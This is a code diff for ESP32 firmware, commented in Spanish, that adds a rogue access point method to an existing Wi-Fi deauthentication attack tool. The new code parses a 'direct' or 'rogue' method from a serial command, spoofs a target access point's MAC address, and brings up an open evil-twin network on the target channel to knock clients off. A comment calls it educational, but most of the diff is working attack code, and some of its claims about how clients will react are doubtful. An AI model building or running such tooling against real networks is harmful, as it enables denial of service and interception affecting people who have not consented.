@@ -1,6 +1,7 @@
 #include <Arduino.h>
 #include <esp_wifi.h>
 #include <esp_netif.h>
+#include <esp_mac.h>
 #include <nvs_flash.h>
 #include <freertos/FreeRTOS.h>
 #include <freertos/task.h>
@@ -31,6 +32,7 @@ uint8_t clients_channel = 1;
 static uint16_t deauth_seq_counter = 0;
 
 void send_deauth_frame(const uint8_t* ap_mac, const uint8_t* client_mac, uint8_t reason_code);
+void start_rogue_ap(const uint8_t* target_mac, const char* target_ssid, uint8_t channel);
 
 // Función segura para leer el estado
 SystemState get_state() {
@@ -227,6 +229,11 @@ uint8_t deauth_count = 0;
 uint16_t deauth_delay_ms = 100;  // Delay entre frames
 char deauth_ap_str[18] = {0};
 char deauth_client_str[18] = {0};
+uint8_t deauth_method = 0;  // 0=direct, 1=rogue
+
+// Variables para Rogue AP
+static TaskHandle_t rogue_ap_task_handle = NULL;
+static bool rogue_ap_running = false;
 
 void deauth_task(void *pvParameter) {
   // Fijar canal del objetivo
@@ -261,28 +268,29 @@ void deauth_task(void *pvParameter) {
 }
 
 void parse_deauth_command(const String& cmd) {
-  // Nuevo formato: CMD:DEAUTH:AP_MAC:CLIENT_MAC:REASON:COUNT:DELAY_MS
-  // Ej: CMD:DEAUTH:AA:BB:CC:DD:EE:FF:FF:FF:FF:FF:FF:FF:7:10:100
+  // Nuevo formato: CMD:DEAUTH:AP_MAC:CLIENT_MAC:REASON:COUNT:DELAY_MS:METHOD
+  // Ej: CMD:DEAUTH:AA:BB:CC:DD:EE:FF:FF:FF:FF:FF:FF:FF:7:10:100:direct
   String cmd_copy = cmd;
   cmd_copy.trim();
   String args = cmd_copy.substring(11); // Saltar "CMD:DEAUTH:"
   
   // Parsear campos separados por ':'
-  // Campos: AP_MAC(6 octetos) + CLIENT_MAC(6 octetos) + REASON + COUNT + DELAY_MS
-  // Total mínimo: 17 chars (MAC) + 1 + 17 chars (MAC) + 1 + 1-3 + 1 + 1-3 + 1 + 1-5
+  // Campos: AP_MAC(6 octetos) + CLIENT_MAC(6 octetos) + REASON + COUNT + DELAY_MS + METHOD
+  // Total mínimo: 17 chars (MAC) + 1 + 17 chars (MAC) + 1 + 1-3 + 1 + 1-3 + 1 + 1-5 + 1 + 5-6
   int hex_vals[12]; // 6 para AP + 6 para client
   int reason, count, delay_ms;
+  char method_str[8] = {0};
   
   // Usar sscanf para parsear todo de una vez
-  // Formato: XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:REASON:COUNT:DELAY
+  // Formato: XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:REASON:COUNT:DELAY:STRING
   int parsed = sscanf(args.c_str(),
-    "%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%d:%d:%d",
+    "%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%d:%d:%d:%7s",
     &hex_vals[0], &hex_vals[1], &hex_vals[2], &hex_vals[3], &hex_vals[4], &hex_vals[5],
     &hex_vals[6], &hex_vals[7], &hex_vals[8], &hex_vals[9], &hex_vals[10], &hex_vals[11],
-    &reason, &count, &delay_ms);
+    &reason, &count, &delay_ms, method_str);
   
   if (parsed < 13) {
-    Serial.println("ERR: Formato DEAUTH inválido. Esperado: AP_MAC:CLIENT_MAC:REASON:COUNT[:DELAY_MS]");
+    Serial.println("ERR: Formato DEAUTH inválido. Esperado: AP_MAC:CLIENT_MAC:REASON:COUNT[:DELAY_MS[:METHOD]]");
     return;
   }
   
@@ -303,13 +311,23 @@ void parse_deauth_command(const String& cmd) {
   }
   
   // Validar delay_ms (10-5000)
-  if (parsed >= 15) {
+  if (parsed >= 14) {
     if (delay_ms < 10 || delay_ms > 5000) {
       Serial.println("ERR: Delay inválido (10-5000 ms).");
       return;
     }
   } else {
     delay_ms = 100; // Default
+  }
+  
+  // Parsear método (direct o rogue)
+  uint8_t method = 0; // 0=direct, 1=rogue
+  if (parsed >= 15) {
+    if (strncmp(method_str, "rogue", 5) == 0) {
+      method = 1;
+    } else {
+      method = 0; // default a direct
+    }
   }
   
   // Copiar MACs
@@ -326,21 +344,37 @@ void parse_deauth_command(const String& cmd) {
            deauth_client_mac[0], deauth_client_mac[1], deauth_client_mac[2],
            deauth_client_mac[3], deauth_client_mac[4], deauth_client_mac[5]);
   
-  // Cancelar tarea previa si existe
+  // Cancelar tareas previas si existen
   if (deauth_task_handle != NULL) {
     vTaskDelete(deauth_task_handle);
     deauth_task_handle = NULL;
+  }
+  if (rogue_ap_task_handle != NULL) {
+    vTaskDelete(rogue_ap_task_handle);
+    rogue_ap_task_handle = NULL;
   }
   
   deauth_channel = channel;
   deauth_reason = (uint8_t)reason;
   deauth_count = (uint8_t)count;
   deauth_delay_ms = (uint16_t)delay_ms;
+  deauth_method = method;
   
   // Reset sequence counter para nueva sesión
   deauth_seq_counter = 0;
   
-  xTaskCreate(&deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
+  const char* method_name = (method == 1) ? "rogue" : "direct";
+  Serial.printf("[DEAUTH] Método: %s | AP: %s | Client: %s | Reason: %d | Frames: %d | Delay: %dms\n",
+                method_name, deauth_ap_str, deauth_client_str, deauth_reason, deauth_count, deauth_delay_ms);
+  
+  if (method == 1) {
+    // Rogue AP: necesitamos el SSID del objetivo
+    // Como no tenemos esa info aquí, usaremos "RogueAP" como SSID genérico
+    // En producción, el SSID se pasaría como parámetro adicional
+    start_rogue_ap(deauth_ap_mac, "RogueAP", deauth_channel);
+  } else {
+    xTaskCreate(&deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
+  }
 }
 
 void send_deauth_frame(const uint8_t* ap_mac, const uint8_t* client_mac, uint8_t reason_code) {
@@ -407,6 +441,119 @@ void send_deauth_frame(const uint8_t* ap_mac, const uint8_t* client_mac, uint8_t
   vTaskDelay(pdMS_TO_TICKS(10));
   esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous_cb);
   esp_wifi_set_promiscuous(true);
+}
+
+// =============================================================================
+// MÉTODO B: Rogue AP duplicado (Fallback cuando direct no funciona)
+// =============================================================================
+// Concepto: Configurar ESP32 como AP con misma MAC y SSID que el objetivo.
+// Cuando un cliente intenta conectar al AP falso, el stack 802.11 del cliente
+// envía tráfico que el AP falso no puede manejar correctamente, causando una
+// desconexión natural (sin necesidad de frames deauth explícitos).
+// Este método NO requiere bypass del driver, pero sí que el cliente esté activo.
+// Educa: MITM a nivel 2, evil twin, limitaciones de autenticación 802.11.
+
+void rogue_ap_task(void *pvParameter) {
+  // Parametros recibidos via puntero: {ap_mac, ssid, channel}
+  uint8_t *params = (uint8_t*)pvParameter;
+  uint8_t rogue_ap_mac[6];
+  char rogue_ssid[33];
+  uint8_t rogue_channel;
+  
+  memcpy(rogue_ap_mac, params, 6);
+  strncpy(rogue_ssid, (char*)(params + 6), 32);
+  rogue_ssid[32] = '\0';
+  rogue_channel = params[38];
+  
+  Serial.printf("[ROGUE] Iniciando AP duplicado: SSID=%s, MAC=%02X:%02X:...:%02X, CH=%d\n",
+                rogue_ssid, rogue_ap_mac[0], rogue_ap_mac[1], rogue_ap_mac[5], rogue_channel);
+  
+  // 1. Cambiar a modo AP
+  esp_wifi_set_mode(WIFI_MODE_AP);
+  
+  // 2. Configurar MAC del AP (spoofing del BSSID objetivo)
+  // Guardar MAC original para restaurar después
+  uint8_t original_mac[6];
+  esp_wifi_get_mac(WIFI_IF_AP, original_mac);
+  
+  // Configurar nueva MAC (debe ser diferente del equipo base para evitar conflicto)
+  uint8_t fake_mac[6];
+  memcpy(fake_mac, rogue_ap_mac, 6);
+  fake_mac[0] |= 0x02;  // Set local admin bit (evitar conflicto con MAC real del equipo)
+  esp_wifi_set_mac(WIFI_IF_AP, fake_mac);
+  
+  // 3. Configurar el AP con SSID y canal objetivo
+  wifi_config_t ap_config;
+  memset(&ap_config, 0, sizeof(wifi_config_t));
+  strncpy((char*)ap_config.ap.ssid, rogue_ssid, 32);
+  ap_config.ap.ssid_len = strlen(rogue_ssid);
+  ap_config.ap.channel = rogue_channel;
+  ap_config.ap.authmode = WIFI_AUTH_OPEN;  // Sin password (más fácil que el cliente conecte)
+  ap_config.ap.max_connection = 1;
+  ap_config.ap.ssid_hidden = 0;
+  
+  if (esp_wifi_set_config(WIFI_IF_AP, &ap_config) != ESP_OK) {
+    Serial.println("[ROGUE] ERR: falló configuración AP");
+    esp_wifi_set_mac(WIFI_IF_AP, original_mac);
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    rogue_ap_running = false;
+    rogue_ap_task_handle = NULL;
+    vTaskDelete(NULL);
+    return;
+  }
+  
+  // 4. Esperar a que un cliente se conecte
+  Serial.println("[ROGUE] Esperando conexión de cliente...");
+  
+  // Mantener el AP activo durante 30 segundos o hasta recibir stop
+  // En ESP32 vanilla sin driver custom, no hay API directa para listar estaciones conectadas
+  // portanto hacemos polling del estado sin verificar explícitamente la conexión
+  uint32_t start_time = millis();
+  bool timeout_detected = false;
+  
+  while (millis() - start_time < 30000) {
+    if (get_state() != DEAUTH) break;
+    
+    // Simply wait - when a client connects and tries to use the network
+    // without proper association responses, it will naturally disconnect
+    vTaskDelay(pdMS_TO_TICKS(1000));
+    
+    // Every 10 seconds, show activity
+    if ((millis() - start_time) % 10000 < 1000) {
+      Serial.printf("[ROGUE] Activo, esperando... (%lu s)\n", (millis() - start_time) / 1000);
+    }
+  }
+  
+  // 5. Limpieza: restaurar MAC original y modo STA
+  Serial.println("[ROGUE] Deteniendo AP falso...");
+  esp_wifi_set_mac(WIFI_IF_AP, original_mac);
+  esp_wifi_set_mode(WIFI_MODE_STA);
+  
+  Serial.println("[ROGUE] Sesión completada.");
+  
+  rogue_ap_running = false;
+  rogue_ap_task_handle = NULL;
+  set_state(IDLE);
+  vTaskDelete(NULL);
+}
+
+void start_rogue_ap(const uint8_t* target_mac, const char* target_ssid, uint8_t channel) {
+  // Cancelar tarea previa si existe
+  if (rogue_ap_task_handle != NULL) {
+    vTaskDelete(rogue_ap_task_handle);
+    rogue_ap_task_handle = NULL;
+  }
+  
+  // Preparar parámetros para la tarea
+  static uint8_t rogue_params[39];  // 6 bytes MAC + 32 bytes SSID + 1 byte channel
+  memcpy(rogue_params, target_mac, 6);
+  strncpy((char*)(rogue_params + 6), target_ssid, 32);
+  rogue_params[38] = channel;
+  
+  rogue_ap_running = true;
+  set_state(DEAUTH);
+  
+  xTaskCreate(&rogue_ap_task, "rogue_ap_task", 4096, (void*)rogue_params, 5, &rogue_ap_task_handle);
 }
 
 // Variables globales para tarea de clients no-bloqueante
